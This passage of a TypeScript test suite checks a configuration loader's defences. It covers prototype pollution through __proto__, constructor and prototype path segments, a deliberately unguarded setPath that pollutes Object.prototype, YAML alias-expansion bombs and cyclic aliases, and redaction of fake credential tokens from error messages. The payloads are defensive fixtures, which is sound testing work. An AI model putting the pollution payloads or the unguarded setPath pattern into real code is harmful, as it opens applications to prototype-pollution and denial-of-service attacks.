        expect((Object.prototype as Record<string, unknown>).polluted).toBeUndefined();
        expect(({} as Record<string, unknown>).pwned).toBeUndefined();
        expect(({} as Record<string, unknown>).polluted).toBeUndefined();

        // The safe sibling key survives; the dangerous ones do not.
        const statusMap = result.value.backers?.github?.status_map as
          | Record<string, unknown>
          | undefined;
        expect(statusMap?.todo).toEqual({ label: "Ready" });
      } finally {
        await cleanup();
      }
    });
  });

  // --- White-box tests: these exercise the guard itself and would
  // genuinely fail if `isSafeSegment`/`FORBIDDEN_SEGMENTS` were removed,
  // independent of zod's own `__proto__` stripping or `Object.create(null)`
  // -- see the review round 2 finding 9 comment above.

  test("isSafeSegment rejects exactly __proto__, constructor, and prototype", () => {
    expect(isSafeSegment("__proto__")).toBe(false);
    expect(isSafeSegment("constructor")).toBe(false);
    expect(isSafeSegment("prototype")).toBe(false);
    expect(isSafeSegment("hooks")).toBe(true);
    expect(isSafeSegment("release.done")).toBe(true);
    expect(isSafeSegment("")).toBe(true);
  });

  test("setPath refuses to write through a forbidden segment at any depth in the path", () => {
    const root: Record<string, unknown> = {};
    setPath(root, ["hooks", "__proto__", "pwned"], true);
    setPath(root, ["a", "constructor", "b"], true);
    setPath(root, ["prototype", "c"], true);

    // The leading *safe* segment of each path still gets its (harmless,
    // null-prototype) container created -- setPath only stops at the
    // forbidden segment itself. What must never happen: the forbidden
    // segment becomes a real property anywhere, and the value it would
    // have carried is never written.
    expect(Object.getOwnPropertyNames(root)).toEqual(["hooks", "a"]);
    expect(Object.getOwnPropertyNames(root.hooks as object)).toEqual([]);
    expect(Object.getOwnPropertyNames(root.a as object)).toEqual([]);
    expect(root.prototype).toBeUndefined();
    expect((root.hooks as Record<string, unknown>).pwned).toBeUndefined();
    expect((Object.prototype as Record<string, unknown>).pwned).toBeUndefined();
  });

  test("flattenLeaves drops a subtree composed entirely of forbidden segments", () => {
    // Final review round, finding 1: `{ __proto__: {...} }` as a JS object
    // *literal* sets the object's [[Prototype]] -- it does NOT create an
    // own enumerable key, so `Object.keys()` on it is already `[]`
    // regardless of whether `FORBIDDEN_SEGMENTS` contains "__proto__" at
    // all. The original version of this test used exactly that literal
    // and so passed unconditionally -- it asserted nothing about the
    // guard. Proven empirically: with `FORBIDDEN_SEGMENTS` neutralized in
    // a scratch copy, the original assertion still held (see the report's
    // RED/GREEN evidence for this finding).
    //
    // `JSON.parse` (matching how `yaml`'s own `doc.toJS()` actually
    // materializes a real "__proto__" mapping key -- verified empirically)
    // and `Object.defineProperty` both create a genuine *own enumerable*
    // property, which `Object.keys()` -- what `flattenLeaves` iterates --
    // does include. `constructor` and `prototype` are added too: unlike
    // `__proto__`, both of those survive `zod`'s own validation as
    // ordinary own string-valued properties (verified in round 1's
    // findings), so `flattenLeaves`'s own filter is the layer uniquely
    // responsible for stopping them -- `setPath`'s independent per-segment
    // check is not the only barrier for these two.
    const protoLeaves = flattenLeaves(JSON.parse('{"__proto__":{"pwned":true}}'), [], new Map());
    expect(protoLeaves.size).toBe(0);

    const ctorTarget: Record<string, unknown> = {};
    Object.defineProperty(ctorTarget, "constructor", {
      value: { hijacked: true },
      enumerable: true,
      writable: true,
      configurable: true,
    });
    expect(flattenLeaves(ctorTarget, [], new Map()).size).toBe(0);

    const protoFieldTarget: Record<string, unknown> = {};
    Object.defineProperty(protoFieldTarget, "prototype", {
      value: { hijacked: true },
      enumerable: true,
      writable: true,
      configurable: true,
    });
    expect(flattenLeaves(protoFieldTarget, [], new Map()).size).toBe(0);
  });

  test("the primitive is real at this layer: a setPath reimplementation with the guard removed genuinely pollutes Object.prototype", () => {
    // This does NOT call the shipped `setPath` -- it is a standalone
    // reimplementation with the segment check removed, matching the exact
    // methodology the security review used to confirm the shipped guard is
    // load-bearing (as opposed to redundant with zod/Object.create(null)).
    // Wrapped in try/finally because this genuinely mutates the real,
    // global `Object.prototype` for the duration -- it must be undone
    // before any other test in this process can observe it.
    function naiveSetPath(root: Record<string, unknown>, path: string[], value: unknown): void {
      let node = root;
      for (let i = 0; i < path.length - 1; i++) {
        const segment = path[i] as string;
        if (typeof node[segment] !== "object" || node[segment] === null) {
          node[segment] = {}; // a plain object -- unlike setPath's Object.create(null)
        }
        node = node[segment] as Record<string, unknown>;
      }
      node[path[path.length - 1] as string] = value;
    }

    try {
      const root: Record<string, unknown> = {};
      naiveSetPath(root, ["hooks", "__proto__", "pwned"], true);
      expect((Object.prototype as Record<string, unknown>).pwned).toBe(true);
      expect(({} as Record<string, unknown>).pwned).toBe(true);
    } finally {
      delete (Object.prototype as Record<string, unknown>).pwned;
    }
    expect((Object.prototype as Record<string, unknown>).pwned).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// AMENDMENT A1 / review round 2 finding 4 -- a record key containing a "."
// must round-trip correctly, not throw a raw (unwrapped) error.
// ---------------------------------------------------------------------------

describe("record keys containing a literal '.' round-trip correctly (AMENDMENT A1, finding 4)", () => {
  test("repo-triggerable: hooks[\"release.done\"] survives merge and appears in entries() with the right path", async () => {
    // Before A1, flattening this to the dotted string "hooks.release.done"
    // and rebuilding via `.split(".")` re-exploded the single record key
    // "release.done" into two segments ("release", "done"), which then
    // failed `effectiveConfigSchema.parse` and threw a raw `ZodError` --
    // not a `CanKanError` -- out of `loadConfig`.
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", 'hooks:\n  "release.done": "echo x"\n');
        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
        expect(result.value.hooks?.["release.done"]).toBe("echo x");
        const entry = result.resolved(["hooks", "release.done"]);
        expect(entry?.path).toEqual(["hooks", "release.done"]);
        expect(entry?.value).toBe("echo x");
      } finally {
        await cleanup();
      }
    });
  });

  test("user-triggerable: a repos.names key containing dots (a real filesystem path) round-trips instead of crashing loadConfig", async () => {
    await withEnv(undefined, async () => {
      const home = process.env.HOME as string;
      const fsPath = "/home/u/.local/share/cankan/personal";
      await writeGlobalConfigFile(
        join(home, ".config"),
        `repos:\n  names:\n    "${fsPath}": personal\n`,
      );
      // Reaching this line at all is the point: before the fix, this
      // exact input threw a raw ZodError out of loadConfig.
      const result = await loadConfig({ env: hermeticEnv() });
      expect(result.value.repos.names?.[fsPath]).toBe("personal");
    });
  });

  test("an alias-expansion bomb yields a wrapped CanKanError, not a bare thrown error", async () => {
    // `layers.ts:205` (`doc.toJS()`) previously sat outside the try/catch
    // that wraps YAML parsing, so yaml's own alias-count guard threw a bare,
    // unwrapped error straight out of loadConfig.
    await withEnv(undefined, async () => {
      const home = process.env.HOME as string;
      let src = "a: &a [1,2,3,4,5,6,7,8,9,10]\n";
      let prev = "a";
      for (let i = 0; i < 10; i++) {
        const name = `b${i}`;
        src += `${name}: &${name} [*${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}]\n`;
        prev = name;
      }
      await writeGlobalConfigFile(join(home, ".config"), src);

      let thrown: unknown;
      try {
        await loadConfig({ env: hermeticEnv() });
      } catch (err) {
        thrown = err;
      }
      expect(isCanKanError(thrown)).toBe(true);
    });
  });
});

// ---------------------------------------------------------------------------
// Final review round, finding 5 -- a cyclic YAML alias must be a load
// error, not a hard RangeError crash.
// ---------------------------------------------------------------------------

describe("a cyclic YAML alias under status_map is a load error naming the file, not a RangeError crash (review round 2 finding 5)", () => {
  test("a self-referencing anchor/alias inside backers.<name>.status_map is rejected", async () => {
    // status_map's inner value type (z.record(z.string(), z.unknown())) is
    // effectiveConfigSchema's only fully opaque leaf, so a cyclic object
    // here survives schema validation by identity. Before the fix, this
    // crashed loadConfig with an uncaught RangeError from either
    // deepFreeze (layers.ts) or flattenLeaves (resolve.ts) recursing
    // forever -- isCanKanError(e) === false, invisible to M3.10's exit map.
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        const path = await writeRepoConfigFile(
          root,
          "config.yml",
          [
            "backers:",
            "  github:",
            "    status_map:",
            '      "To Do": &c',
            "        state:",
            "          loop: *c",
            "",
          ].join("\n"),
        );
        let thrown: unknown;
        try {
          await loadConfig({ repoRoot: root, env: hermeticEnv() });
        } catch (err) {
          thrown = err;
        }
        expect(isCanKanError(thrown)).toBe(true);
        expect((thrown as Error).message).toContain(path);
      } finally {
        await cleanup();
      }
    });
  });
});

// ---------------------------------------------------------------------------
// Final review round, finding 6 -- POLICY_VIOLATION's message/details must
// truncate a config-supplied record key too, not just describeIssue's.
// ---------------------------------------------------------------------------

describe("POLICY_VIOLATION truncates a config-supplied record key in both message and details (review round 2 finding 6)", () => {
  test("a hostile repo forces the throw (hooks: !policy {}) while local.yml holds a credential-shaped hook name", async () => {
    // Round 1's S2 fix (truncateForDisplay) only ever reached
    // `describeIssue` in layers.ts -- this is resolve.ts's own, symmetric
    // echo site, missed by that fix. Rated Important rather than Minor
    // because the repo *forces* the echo via the pin, rather than merely
    // waiting for a validation failure to happen to expose it.
    await withEnv(undefined, async () => {
      const { root, cleanup } = await makeTempRepoRoot();
      try {
        await writeRepoConfigFile(root, "config.yml", "hooks: !policy {}\n");
        const token = `ghp_${"B".repeat(36)}`;
        await writeRepoConfigFile(root, "local.yml", `hooks:\n  ${token}: "echo x"\n`);

        let thrown: unknown;
        try {
          await loadConfig({ repoRoot: root, env: hermeticEnv() });
        } catch (err) {
          thrown = err;
        }
        expect(isCanKanError(thrown)).toBe(true);
        const err = thrown as InstanceType<typeof Error> & { code: string; details?: unknown };
        expect(err.code).toBe("POLICY_VIOLATION");
        expect(err.message).not.toContain(token);
        expect(JSON.stringify(err.details)).not.toContain(token);
        // `JSON.stringify(err)` is the actual --json-consumer-visible
        // shape, via CanKanError.toJSON -- the same check R16's own test
        // makes.
        expect(JSON.stringify(err)).not.toContain(token);
        // Still names the truncated key and the pinning file, so R13's
        // "names the offending key" and R7's own contract both still hold.
        expect(err.message).toContain("hooks.");
        expect(err.message).toContain("is set as policy by");
      } finally {
        await cleanup();
      }
    });
  });
});

// ---------------------------------------------------------------------------
// R16 -- the yaml credential-leak mitigation.
// ---------------------------------------------------------------------------

describe("the yaml credential-leak mitigation (R16, required)", () => {
  test("a YAML syntax error near personal.remote never leaks the token into message or details, but would have leaked without the mitigation", async () => {
    await withEnv(undefined, async () => {
      const home = process.env.HOME as string;
      const token = "git@github.com:alice/cankan-personal-SUPER-SECRET-TOKEN.git";
      // Unterminated double-quote directly on the line carrying the token,
      // so yaml's own (unsanitized) error message would quote this exact
      // line verbatim.
      const content = `personal:\n  remote: "${token}\n`;
      const path = await writeGlobalConfigFile(join(home, ".config"), content);

      let thrown: unknown;
      try {
        await loadConfig({ env: hermeticEnv() });
      } catch (err) {
        thrown = err;
      }

      expect(isCanKanError(thrown)).toBe(true);
      const err = thrown as InstanceType<typeof Error> & {
        details?: Record<string, unknown>;
        cause?: unknown;
      };

      expect(err.message).not.toContain(token);
      expect(JSON.stringify(err.details)).not.toContain(token);
      // Proves the fixture would genuinely have leaked without the
      // mitigation -- yaml's own error carries the raw source line.
      expect(String(err.cause)).toContain(token);
      expect(err.message).toContain(path);
    });
  });
});

describe("S2 -- unrecognized_keys must not put the full offending key in message/details", () => {
  test("a YAML indentation mistake that turns a credential-bearing value into a map key is truncated", async () => {
    await withEnv(undefined, async () => {
      const home = process.env.HOME as string;
      const longToken =
        "git@host:user:TOKEN_ABCDEFGHIJKLMNOPQRSTUVWXYZ_1234567890@example.com/x.git";
      expect(longToken.length).toBeGreaterThan(40);
      const content = `personal:\n  ${longToken}: foo\n`;
      await writeGlobalConfigFile(join(home, ".config"), content);

      let thrown: unknown;
      try {
        await loadConfig({ env: hermeticEnv() });
      } catch (err) {
        thrown = err;
      }

      expect(isCanKanError(thrown)).toBe(true);
      const err = thrown as InstanceType<typeof Error> & { details?: Record<string, unknown> };
      expect(err.message).not.toContain(longToken);
      expect(JSON.stringify(err.details)).not.toContain(longToken);
      // A truncated prefix is still named, per R13's "names the offending key".
      expect(err.message).toContain(longToken.slice(0, 20));
    });
  });

  test("review round 2 finding 2: a credential-shaped record key inside issue.path (not issue.keys) is also truncated", async () => {
    // The first version of `describeIssue` truncated `issue.keys`
    // (`unrecognized_keys`'s echo site) but not `issue.path` itself. For
    // any issue *inside* a z.record(...) section, the path segments ARE
    // the config-supplied record keys -- here, `queues`'s record key is a
    // credential-shaped string, and the invalid *value* (`5`, not an
    // object) produces an `invalid_type` issue whose `path` carries that
    // key in full. This is a second, symmetric echo site the original S2
    // fix missed entirely.
    await withEnv(undefined, async () => {
      const home = process.env.HOME as string;
      const longToken = "git@host:user:ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@example.com/x.git";
      expect(longToken.length).toBeGreaterThan(20);
      const content = `queues:\n  "${longToken}": 5\n`;
      await writeGlobalConfigFile(join(home, ".config"), content);

      let thrown: unknown;
      try {
        await loadConfig({ env: hermeticEnv() });
      } catch (err) {
        thrown = err;
      }

      expect(isCanKanError(thrown)).toBe(true);
      const err = thrown as InstanceType<typeof Error> & { details?: Record<string, unknown> };
      expect(err.message).not.toContain(longToken);
      expect(JSON.stringify(err)).not.toContain(longToken);
      expect(err.message).toContain(longToken.slice(0, 20));
    });
  });
});
